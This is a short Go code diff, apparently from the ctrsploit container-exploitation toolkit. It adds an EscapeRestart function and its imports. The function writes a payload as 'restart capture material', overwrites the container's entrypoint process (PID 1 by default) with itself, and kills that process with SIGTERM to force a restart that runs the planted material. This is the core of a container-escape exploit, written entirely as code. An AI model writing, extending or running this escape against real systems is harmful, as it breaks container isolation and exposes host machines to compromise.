@@ -4,6 +4,10 @@ import (
 	_ "embed"
 	"fmt"
 	"os"
+	"syscall"
+	"time"
+
+	"github.com/ctrsploit/sploit-spec/pkg/log"
 )
 
 type restartMaterialPaths struct {
@@ -24,6 +28,24 @@ var restartPaths = restartMaterialPaths{
 		"/lib64/ld-linux-x86-64.so.2",
 		"/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
 	},
+}
+
+func EscapeRestart(primitive Primitive, pid int, payload []byte, timeout time.Duration) error {
+	if pid <= 0 {
+		pid = 1
+	}
+	if err := WriteRestartMaterial(primitive, payload); err != nil {
+		return err
+	}
+	log.Logger.Info("Prepared restart capture material successfully")
+	if err := WriteProcessEntrypointAsSelf(primitive, pid); err != nil {
+		return err
+	}
+	log.Logger.Info("Overwritten container entrypoint successfully")
+	log.Logger.Info("Triggering container restart ...")
+	time.Sleep(time.Second)
+	_ = syscall.Kill(pid, syscall.SIGTERM)
+	return nil
 }
 
 func WriteRestartMaterial(primitive Primitive, payload []byte) error {
